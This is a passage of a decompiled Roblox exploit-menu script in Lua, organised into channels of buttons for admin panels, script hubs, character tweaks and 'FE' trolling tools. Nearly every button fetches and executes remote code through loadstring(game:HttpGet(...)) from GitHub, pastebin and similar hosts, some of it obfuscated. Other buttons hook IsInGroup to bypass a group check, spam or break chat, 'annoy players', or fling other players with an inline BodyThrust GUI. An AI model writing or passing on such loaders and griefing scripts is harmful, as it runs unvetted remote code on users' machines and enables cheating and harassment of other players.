    vu1:Notification("Notification", "Nameless Admin Activated!", "Okay!")
end)
v240:Button("Enable fates-admin", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
    vu1:Notification("Notification", "fates-admin Activated!", "Okay!")
end)
v240:Button("Enable NTO Admin", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TwomadJR/nto/main/admiin"))()
    vu1:Notification("Notification", "NTO Admin Activated!", "Okay!")
end)
v240:Button("Enable Revis Admin", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlikeyocutgHAH12/FSFGEGEGE/main/Reviz%20admin%20V2%20ROBLOX.txt"))()
    vu1:Notification("Notification", "Revis Admin Activated!", "Okay!")
end)
v240:Button("[ FE ] Admin Tools Giver", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/AZVi2tuK"))()
    vu1:Notification("Notification", "[ FE ] Admin Tools Giver Activated!", "Okay!")
end)
v240:Button("Universal Admin Panel Reborn", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/apanel", true))()
    vu1:Notification("Notification", "Universal Admin Panel Reborn Activated!", "Okay!")
end)
v240:Button("Universal Admin Panel Gui", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/y94Ejz3B", true))()
    vu1:Notification("Notification", " Universal Admin Panel Gui Activated!", "Okay!")
end)
v240:Button("Enable Admin spy gui", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MichaelScripter/MiniScript/main/Spy%20gui.lua"))()
    vu1:Notification("Notification", "Admin spy gui Activated!", "Okay!")
end)
v240:Button("Enable G00byGUIv8", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/dsd/main/G00byGUIv8", true))()
    vu1:Notification("Notification", "G00byGUIv8 Activated!", "Okay!")
end)
v240:Button("Enable Homebrew Admin", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-or-FE-Homebrew-Admin-3106"))()
    vu1:Notification("Notification", "Homebrew Admin Activated!", "Okay!")
end)
v240:Button("Enable cmd", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/lxte/cmd/main/testing-main.lua"))()
    vu1:Notification("Notification", "cmd Activated!", "Okay!")
end)
local v241 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 ScriptHubs")
v241:Button("Enable AuratusX (OP)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RealMrQuacks/AuratusX/master/Load"))()
    vu1:Notification("Notification", "AuratusX Activated!", "Okay!")
end)
v241:Button("Enable Brans GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BranIsComp/BranScript/main/BranScript", true))()
    vu1:Notification("Notification", "Brans Gui Activated!", "Okay!")
end)
v241:Button("Enable EonHub Gui", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/eonhubsrc/main/eonhub", true))()
    vu1:Notification("Notification", "ScriptHub X eon Activated!", "Okay!")
end)
v241:Button("Enable ScriptWorld Gui", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/scriptworld/main/scriptworld", true))()
    vu1:Notification("Notification", "ScriptWorld Activated!", "Okay!")
end)
v241:Button("Enable Unfair-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua", true))()
    vu1:Notification("Notification", "UnFair-Hub!", "Okay!")
end)
v241:Button("Enable ScriptHub", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/cHfXLMNP", true))()
    vu1:Notification("Notification", "ScriptHub Activated", "Okay!")
end)
v241:Button("Enable V-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Quan8008/V-Hub/Master/Launch-Screen.lua"))()
    vu1:Notification("Notification", "V-Hub Activated", "Okay!")
end)
v241:Button("Enable Moon-UIV13", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlikeyocutgHAH/MoonUI-v13-102-SCRIPTS/main/MoonUI%20v13!"))()
    vu1:Notification("Notification", "MoonUI Activated", "Okay!")
end)
v241:Button("Enable BIDO SKINS V1.5", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BidoSkinsYT/BidoSkinsYT/main/Bido%20SkinsV1.5"))()
    vu1:Notification("Notification", "BIDO SKINS V1.5 Activated", "Okay!")
end)
v241:Button("Enable SCRIPT SEARCHER GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))()
    vu1:Notification("Notification", "SCRIPT SEARCHER GUI Activated!", "Okay!")
end)
v241:Button("Enable Games Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TakeModzz/Games-Hub-Script/main/Games%20Hub%20(Always%20updated)"))()
    vu1:Notification("Notification", "GameHub Activated", "Okay!")
end)
v241:Button("Enable DAVI SCRIPT HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Davicoderliner/davigui/main/Daviguiv2loader.lua", true))()
    vu1:Notification("Notification", "DAVI SCRIPT HUB Activated", "Okay!")
end)
v241:Button("Enable NukeVsCity ScriptHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/TheALLHACKLoader/main/NukeLoader"))()
    vu1:Notification("Notification", "NukeVSCity Activated", "Okay!")
end)
v241:Button("Enable FE-TROLLING GUI", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/HubbyScripts/FE-Trolling-Hub/main/source"))()
    vu1:Notification("Notification", "FE-TROLLING GUI Activated", "Okay!")
end)
v241:Button("Enable RAFAN & BUTIF ScriptHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/HubbyScripts/FE-Trolling-Hub/main/source"))()
    vu1:Notification("Notification", "RAFAN & BUTIF ScriptHub Activated", "Okay!")
end)
v241:Button("Enable Universal Admin Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FeyzRBLX/FeyzHub/main/Feyz%20Hub%20V2"))()
    vu1:Notification("Notification", "Universal Admin Hub Activated", "Okay!")
end)
v241:Button("Enable BritshV9 ScriptHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxArceusXScript/ProtectedLol/main/BritishHubV9"))()
    vu1:Notification("Notification", "BritshV9 ScriptHub Activated", "Okay!")
end)
v241:Button("Enable PotHub", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/Tubers39/6324c8bc8800c3ede3306095085401ae/raw/b16a421c9a1a50ab819b23743ac056604d0927e0/PoTHUB", true))()
    vu1:Notification("Notification", "PotHub Activated", "Okay!")
end)
v241:Button("enable EZ-HUB", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Ez-Hub_168"))()
    vu1:Notification("Notification", "EZ-HUB Activated", "Okay!")
end)
v241:Button("enable Pan-GUI ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Slinzo1/Pan-GUI-/main/Pan%20guu"))()
    vu1:Notification("Notification", "Pan-GUI Activated", "Okay!")
end)
v241:Button("enable VG-SCRIPT ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub"))()
    vu1:Notification("Notification", "VG-SCRIPT Activated", "Okay!")
end)
v241:Label("this an pc script u cant move ui it will work on mobile")
v241:Button("enable Owl Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()
    vu1:Notification("Notification", "OwlHub Activated", "Okay!")
end)
v241:Button("enable DarkHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
    vu1:Notification("Notification", "DarkHub Activated", "Okay!")
end)
v241:Button("enable WertyScript", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Agzes/Q-W-S_scripts/main/WertyScript.lua"))()
    vu1:Notification("Notification", "WertyScript Activated", "Okay!")
end)
v241:Button("enable GhostHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub"))()
    vu1:Notification("Notification", "GhostHub Activated", "Okay!")
end)
v241:Button("enable SussyHub", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/Nilrogram/8b0c8bd710be142f383c71f79279752c/raw/e4fb01a7de7cd498bb53270d2ad191dfab268a88/FE%2520SussyHub", true))()
    vu1:Notification("Notification", "SussyHub Activated", "Okay!")
end)
v241:Button("enable MobileHub", function()
    loadstring(game:HttpGet("https://shz.al/~mobile-hub"))()
    vu1:Notification("Notification", "MobileHub Activated", "Okay!")
end)
v241:Button("enable Trip-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/elxocasXD/Trip-Hub/main/Free%20Loader.lua"))()
    vu1:Notification("Notification", "Trip-Hub Activated", "Okay!")
end)
v241:Button("enable V.G_Moblie", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G_Moblie/main/Files/Loader"))()
    vu1:Notification("Notification", "V.G_Moblie Activated", "Okay!")
end)
v241:Button("enable GigaChad-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/OWJBWKQLAISH/GigaChad-Hub/main/Version%20V3.5"))()
    vu1:Notification("Notification", "GigaChad-Hub Activated", "Okay!")
end)
v241:Button("enable SHAKARS HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BidoSkinsYT/BidoSkinsYT/main/Shakar%20Hub%20V3"))()
    vu1:Notification("Notification", "SHAKARS HUB Activated", "Okay!")
end)
v241:Button("enable BIDO SKINS", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BidoSkinsYT/BidoSkinsYT/main/Bido%20Skins%20V1.7"))()
    vu1:Notification("Notification", "BIDO SKINS Activated", "Okay!")
end)
v241:Button("enable FROZEN HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/FrozenScripts/frozenhubb/main/frozen777", true))()
    vu1:Notification("Notification", "FROZEN HUB Activated", "Okay!")
end)
v241:Button("enable Cat HUB", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/catter-y/cat-hub/main/main"))()
    vu1:Notification("Notification", "Cat HUB Activated", "Okay!")
end)
v241:Button("Enable Krypton", function()
    _G.License = true
    loadstring(game:HttpGet("https://github.com/RENBex6969/KryptonReload/raw/main/Krypton.lua"))()
    vu1:Notification("Notification", "Krypton Activated", "Okay!")
end)
v241:Button("Enable VenoxHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/venoxhh/venoxV1/main/main.lua"))()
    vu1:Notification("Notification", "VenoxHub Activated", "Okay!")
end)
v241:Button("Enable EquinoxHub", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/wzB1Qh78", true))()
    vu1:Notification("Notification", "EquinoxHub Activated", "Okay!")
end)
v241:Button("Enable sirius", function()
    loadstring(game:HttpGet("https://sirius.menu/script"))()
    vu1:Notification("Notification", "sirius Activated", "Okay!")
end)
v241:Button("Enable DomainX", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/DomainX/main/source", true))()
    vu1:Notification("Notification", "DomainX Activated", "Okay!")
end)
v241:Button("Enable UniverseX", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/4bn47Jb0"))()
    vu1:Notification("Notification", "UniverseX Activated", "Okay!")
end)
v241:Button("Enable MoonUI-v10", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/IlikeyocutgHAH12/MoonUI-v10-/main/MoonUI%20v10"))()
    vu1:Notification("Notification", "MoonUI-v10 Activated", "Okay!")
end)
v241:Button("Enable SimpleHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Simple-Hub-X-Gear-SSX.lua/main/Gear%20SSX%20X%20Simple%20Hub"))()
    vu1:Notification("Notification", "SimpleHub Activated", "Okay!")
end)
v241:Button("Enable SHV11", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/J1MfBXv6"))()
    vu1:Notification("Notification", "SHV11 Activated", "Okay!")
end)
v241:Button("Enable SHV2", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/tuDMk1pr", true))()
    vu1:Notification("Notification", "SHV2 Activated", "Okay!")
end)
v241:Button("Enable Pendulum Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))()
    vu1:Notification("Notification", "Pendulum Hub Activated", "Okay!")
end)
v241:Button("Enable GhostHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub"))()
    vu1:Notification("Notification", "GhostHub Activated", "Okay!")
end)
v241:Button("Enable SkyHub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
    vu1:Notification("Notification", "SkyHub Activated", "Okay!")
end)
v241:Button("Enable Game-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()
    vu1:Notification("Notification", "Game-Hub Activated", "Okay!")
end)
v241:Button("Enable Multi-Scripter-X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Multi-Scripter-X/main/loader"))()
    vu1:Notification("Notification", "Multi-Scripter-X Activated", "Okay!")
end)
v241:Button("Enable ScriptHubV2(OLD)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/SCRIPTHUBV2/main/SCRIPTHUBV2", true))()
    vu1:Notification("Notification", "ScripthubV2 Activated", "Okay!")
end)
v241:Button("Enable ScriptHubV3Beta(OLD-2024)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/scripthubv3beta/main/scripthubv3beta1", true))()
    vu1:Notification("Notification", "ScripthubV3 Activated", "Okay!")
end)
v241:Button("Enable System-hub-V2", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-System-hub-V2-13161"))()
    vu1:Notification("Notification", "System-hub-V2 Activated", "Okay!")
end)
v241:Button("Enable RandomsX-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Randoms1972/RandomsX-Hub-Final/main/Final%20V1.4"))()
    vu1:Notification("Notification", "RandomsX-Hub Activated", "Okay!")
end)
v241:Button("Enable Game-Hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()
    vu1:Notification("Notification", "Game-Hub Activated", "Okay!")
end)
v241:Button("Enable QP-HUBV2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/QP-Community/Roblox-Exploit/main/Loader2.lua"))()
    vu1:Notification("Notification", "QP-HUBV2 Activated", "Okay!")
end)
v241:Button("Enable Tiger hub x v3.5", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/balintTheDevX/Tiger-X-V3/main/Tiger%20X%20V3.5%20Fixed"))()
    vu1:Notification("Notification", "Tiger hub x v3.5 Activated", "Okay!")
end)
local v242 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 character")
v242:Button("Enable Steal Avatars (OP)", function()
    hookfunction(game.Players.LocalPlayer.IsInGroup, function()
        return true
    end)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/P-TOOL/main/P-tool", true))()
    loadstring("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Invooker11/Outfit/main/OutfitCopier.lua\", true))()\n")()
    vu1:Notification("Notification", "Steal Avatars Activated!", "Okay!")
end)
v242:Button("Enable Fake Limiteds", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/fakelimitedsv2/main/fakelimitedsv2", true))()
    vu1:Notification("Notification", "Fake Limiteds Activated!", "Okay!")
end)
v242:Button("Enable Animations R15 ", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/0MLPL32f"))()
    vu1:Notification("Notification", " Animations R15 Activated", "Okay!")
end)
v242:Button("Enable Headless N Korblox (FE) ", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/H5yx10Jq"))()
    vu1:Notification("Notification", " Headless-Korblox Activated!", "Okay!")
end)
v242:Button("ENABLE UNIVERSAL* HUGE CHARACTER", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/HDmrKZfm", true))()
    vu1:Notification("Notification", "**UNIVERSAL* HUGE CHARACTER Activated", "Okay!")
end)
v242:Button("Enable FE-FREE-EMOTES", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/eCpipCTH"))()
    vu1:Notification("Notification", "FE-FREE-EMOTES Activated!", "Okay!")
end)
v242:Button("Enable [FE] Rochips Panel", function()
    loadstring(game:HttpGet("https://glot.io/snippets/gwwv877ga3/raw/main.lua"))()
    vu1:Notification("Notification", "FE-FREE-EMOTES Activated!", "Okay!")
end)
v242:Label("takes about 1-8 minutes to load")
v242:Button("Enable Rainbow-character ", function()
    local v243, v244, v245 = pairs(game.Players.LocalPlayer.Character:GetChildren())
    while true do
        local v246
        v245, v246 = v243(v244, v245)
        if v245 == nil then
            break
        end
        if v246:IsA("MeshPart") then
            v246.Material = "ForceField"
            spawn(function()
                while wait() do
                    local v247, v248, v249 = pairs(game.Players.LocalPlayer.Character:GetChildren())
                    while true do
                        local v250
                        v249, v250 = v247(v248, v249)
                        if v249 == nil then
                            break
                        end
                        if v250:IsA("MeshPart") then
                            v250.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
                            wait()
                        end
                    end
                end
            end)
        end
    end
    vu1:Notification("Notification", " RainBow-character Activated!", "Okay!")
end)
v242:Button("Enable FE Animation Changer ", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RubyBoo4life/Scripts/main/animations.vis"))()
    vu1:Notification("Notification", " FE Animation Changer Activated", "Okay!")
end)
v242:Button("Enable FE Animation Changer(GazerHA)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GazerHA/Animated/main/Main%20Loader"))()
    vu1:Notification("Notification", " FE Animation Changer(GazerHA) Activated", "Okay!")
end)
v242:Button("Enable FE (R6/R15) 210+ Emotes / 31 Animations", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Eazvy/public-scripts/main/Universal_Animations_Emotes.lua"))()
    vu1:Notification("Notification", "Eazvy Activated", "Okay!")
end)
v242:Button("Enable animation libary (over 1700 animations)", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/GWBDGcQ6"))()
    vu1:Notification("Notification", "animation libary Activated", "Okay!")
end)
local v251 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 BetterRoblox")
v251:Button("Enable Shaders", function()
    loadstring(game:HttpGet("https://pastefy.app/xXkUxA0P/raw", true))()
    vu1:Notification("Notification", "Shaders Activated!", "Okay!")
end)
v251:Button("Enable ShadersRTX", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/1jh7SuWj"))()
    vu1:Notification("Notification", "Shaders Activated!", "Okay!")
end)
v251:Button("Enable BetterRobloxV2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/betterrobloxui/main/betterroblox", true))()
    vu1:Notification("Notification", "BetterRobloxV2 Activated!", "Okay!")
end)
v251:Button("Enable BetterRobloxV3(PC)", function()
    loadstring(game:HttpGet("https://astroswrld.club/BetterRoblox/Loader"))()
    vu1:Notification("Notification", "BetterRobloxV3 Activated!", "Okay!")
end)
v251:Button("Enable strechedres", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/strechedres/main/strechedres", true))()
    vu1:Notification("Notification", "strechedres Activated!", "Okay!")
end)
v251:Button("Enable strechedresv2", function()
    getgenv().Resolution = {
        [".gg/scripters"] = 0.65
    }
    local vu252 = workspace.CurrentCamera
    if getgenv().gg_scripters == nil then
        game:GetService("RunService").RenderStepped:Connect(function()
            vu252.CFrame = vu252.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, getgenv().Resolution[".gg/scripters"], 0, 0, 0, 1)
        end)
    end
    getgenv().gg_scripters = "Aori0001"
    vu1:Notification("Notification", "strechedres Activated!", "Okay!")
end)
v251:Button("Enable bettervolume", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/bettervolume/main/bettervolume", true))()
    vu1:Notification("Notification", "bettervolume Activated!", "Okay!")
end)
v251:Button("Enable Lag-Reducer", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/lag-reducer/main/lagreducer", true))()
    vu1:Notification("Notification", "Lag-reducer Activated!", "Okay!")
end)
v251:Button("Enable Better-AppleWare UI (XORA)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRealXORA/Roblox/Scripts/Better%20Apple-Ware%20UI", true))()
    vu1:Notification("Notification", "Better-AppleWare UI (XORA) Activated!", "Okay!")
end)
local v253 = v81:Channel("\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189 \226\128\162 FE")
v253:Button("Enable FE trolling gui (300+ scripts)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
    vu1:Notification("Notification", "FE trolling gui Activated!", "Okay!")
end)
v253:Button("Enable Universal-Script-R6-Animations-on-R15{FE}", function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-R6-Animations-on-R15-16865"))("t.me/arceusxscripts")
    vu1:Notification("Notification", "Universal-Script-R6-Animations-on-R15{FE} Activated!", "Okay!")
end)
v253:Button("Enable *FE* GENERATE ANY KEYBIND SCRIPT (OP) ", function()
    loadstring(game:HttpGet("https://pastefy.app/Ujm4HWxh/raw", true))()
    vu1:Notification("Notification", "*FE* GENERATE ANY KEYBIND SCRIPT Activated!", "Okay!")
end)
v253:Button("Enable FE Chat Spammer", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Jo"))()
    vu1:Notification("Notification", "FE-Chat-spammer Activated!", "Okay!")
end)
v253:Button("Enable FE CHAT BREAKER", function()
    loadstring(game:HttpGet("hhttps://raw.githubusercontent.com/BidoSkinsYT/BidoSkinsYT/main/Fe%20Chat%20Breaker", true))()
    vu1:Notification("Notification", "FE Chat Breaker Activated!", "Okay!")
end)
v253:Button("Enable FE hat Orbit/Controller Any Hat and Items OP", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/BsJ4xfXu"))()
    vu1:Notification("Notification", "FE FE hat Orbit Activated!", "Okay!")
end)
v253:Button("Enable *FE* CUSTOM SITING ANIMATIONS", function()
    loadstring(game:HttpGet("https://pastefy.app/XKxQtK2K/raw", true))()
    vu1:Notification("Notification", "*FE* CUSTOM SITING ANIMATIONS! Activated!", "Okay!")
end)
v253:Button("Enable *FE* CHAT ARTICLES", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BidoSkinsYT/BidoSkinsYT/main/Fe%20Chat%20article", true))()
    vu1:Notification("Notification", "*FE* CHAT ARTICLES Activated!", "Okay!")
end)
v253:Button("FE? PLAY ANY MUSIC", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/g97RafnE", true))()
    vu1:Notification("Notification", "FE? PLAY ANY MUSIC Activated!", "Okay!")
end)
v253:Button("Enable *FE* REWIND SCRIPT GUI V2", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/cgWLwdN9", true))()
    vu1:Notification("Notification", "*FE* REWIND SCRIPT GUI V2 Activated!", "Okay!")
end)
v253:Button("Enable *FE* CHAT ART SCRIPT", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/omegachadgaming/mongus/main/main.lua", true))()
    vu1:Notification("Notification", "*FE* CHAT ART SCRIPT Activated!", "Okay!")
end)
v253:Button("Enable *FE* MOUSE CURSOR SCRIPT V2", function()
    loadstring(game:HttpGet("https://pastefy.app/58d8d52G/raw", true))()
    vu1:Notification("Notification", "*FE* MOUSE CURSOR SCRIPT V2 Activated!", "Okay!")
end)
v253:Button("Enable SUPER OP FE ANNOY PLAYERS GUI", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/ZME5dX7w"))()
    vu1:Notification("Notification", "*SUPER OP FE ANNOY PLAYERS GUI Activated!", "Okay!")
end)
v253:Button("Enable [FE] Ultimate Fling Script", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/GfwkiUTV", true))()
    vu1:Notification("Notification", "*[FE] Ultimate Fling Script Activated!", "Okay!")
end)
v253:Button("Enable Fe Chat Executor", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/chat-executor/main/chat-executor", true))()
    vu1:Notification("Notification", "*Fe Chat Executor  Activated!", "Okay!")
end)
v253:Button("Enable [FE] Joy", function()
    loadstring(game:HttpGetAsync("https://pastebin.com/raw/LEAQuKj0"))()
    vu1:Notification("Notification", "[FE] Joy Activated!", "Okay!")
end)
v253:Button("Enable Dreamybull GUI", function()
    require(15232587754).DreamGUI("user")
    vu1:Notification("Notification", "Dreamybull GUI Activated!", "Okay!")
end)
v253:Button("Enable C00lkidd reawakened", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/YjjW74s2"))()
    vu1:Notification("Notification", "C00lkidd reawakened Activated!", "Okay!")
end)
v253:Button("Enable K00pgui op", function()
    require(14412108127).gui("user")
    vu1:Notification("Notification", "K00pgui op Activated!", "Okay!")
end)
v253:Button("Enable FE Ultimate Trolling GUI", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/dark-modz/3e50ce0fdd03713dfbeb1845ee6f52d7/raw/630318908f56a984db9568a89e33eadb7998158a/feutg1", true))()
    vu1:Notification("Notification", "FE Ultimate Trolling GUI Activated!", "Okay!")
end)
v253:Button("Enable Fe crawl script R6/R15", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_vZDX8j5ggfAf58QhdJ59BVEmF6nmZgq4Mcjt2l8wn16CiStIW2P6EkNc605qv9K4.lua.txt"))()
    vu1:Notification("Notification", "Fe crawl script R6/R15 Activated!", "Okay!")
end)
v253:Button("Enable [FE] yeet gui", function()
    local vu254 = game:FindService("Players").LocalPlayer
    local function vu274(p255)
        local v256 = {}
        local v257 = p255:lower()
        if v257 == "all" then
            local v258, v259, v260 = pairs(game:FindService("Players"):GetPlayers())
            while true do
                local v261
                v260, v261 = v258(v259, v260)
                if v260 == nil then
                    break
                end
                table.insert(v256, v261)
            end
        elseif v257 == "others" then
            local v262, v263, v264 = pairs(game:FindService("Players"):GetPlayers())
            while true do
                local v265
                v264, v265 = v262(v263, v264)
                if v264 == nil then
                    break
                end
                if v265.Name ~= vu254.Name then
                    table.insert(v256, v265)
                end
            end
        elseif v257 == "me" then
            local v266, v267, v268 = pairs(game:FindService("Players"):GetPlayers())
            while true do
                local v269
                v268, v269 = v266(v267, v268)
                if v268 == nil then
                    break
                end
                if v269.Name == vu254.Name then
                    table.insert(v256, v269)
                end
            end
        else
            local v270, v271, v272 = pairs(game:FindService("Players"):GetPlayers())
            while true do
                local v273
                v272, v273 = v270(v271, v272)
                if v272 == nil then
                    break
                end
                if v273.Name:lower():sub(1, # p255) == p255:lower() then
                    table.insert(v256, v273)
                end
            end
        end
        return v256
    end
    local function vu277(p275, p276)
        game:FindService("StarterGui"):SetCore("SendNotification", {
            Title = "yeet gui",
            Text = p275,
            Icon = "rbxassetid://2005276185",
            Duration = p276 or 3
        })
    end
    local v278 = Instance.new("ScreenGui")
    local v279 = Instance.new("ImageLabel")
    local v280 = Instance.new("Frame")
    local v281 = Instance.new("TextLabel")
    local vu282 = Instance.new("TextBox")
    local v283 = Instance.new("TextButton")
    v278.Name = "h"
    v278.Parent = game:GetService("CoreGui")
    v278.ResetOnSpawn = false
    v279.Name = "Main"
    v279.Parent = v278
    v279.Active = true
    v279.Draggable = true
    v279.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    v279.BorderSizePixel = 0
    v279.Position = UDim2.new(0.174545452, 0, 0.459574461, 0)
    v279.Size = UDim2.new(0, 454, 0, 218)
    v279.Image = "rbxassetid://2005276185"
    v280.Name = "Top"
    v280.Parent = v279
    v280.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
    v280.BorderSizePixel = 0
    v280.Size = UDim2.new(0, 454, 0, 44)
    v281.Name = "Title"
    v281.Parent = v280
    v281.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
    v281.BorderSizePixel = 0
    v281.Position = UDim2.new(0, 0, 0.295454562, 0)
    v281.Size = UDim2.new(0, 454, 0, 30)
    v281.Font = Enum.Font.SourceSans
    v281.Text = "FE Yeet Gui (trollface edition)"
    v281.TextColor3 = Color3.fromRGB(255, 255, 255)
    v281.TextScaled = true
    v281.TextSize = 14
    v281.TextWrapped = true
    vu282.Parent = v279
    vu282.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
    vu282.BorderSizePixel = 0
    vu282.Position = UDim2.new(0.0704845786, 0, 0.270642221, 0)
    vu282.Size = UDim2.new(0, 388, 0, 62)
    vu282.Font = Enum.Font.SourceSans
    vu282.PlaceholderText = "Who do i destroy(can be shortened)"
    vu282.Text = ""
    vu282.TextColor3 = Color3.fromRGB(255, 255, 255)
    vu282.TextScaled = true
    vu282.TextSize = 14
    vu282.TextWrapped = true
    v283.Parent = v279
    v283.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
    v283.BorderSizePixel = 0
    v283.Position = UDim2.new(0.10352423, 0, 0.596330225, 0)
    v283.Size = UDim2.new(0, 359, 0, 50)
    v283.Font = Enum.Font.SourceSans
    v283.Text = "Cheese em\'"
    v283.TextColor3 = Color3.fromRGB(255, 255, 255)
    v283.TextScaled = true
    v283.TextSize = 14
    v283.TextWrapped = true
    v283.MouseButton1Click:Connect(function()
        local v284 = vu274(vu282.Text)
        if v284[1] then
            local v285 = v284[1]
            local v286 = Instance.new("BodyThrust", vu254.Character.HumanoidRootPart)
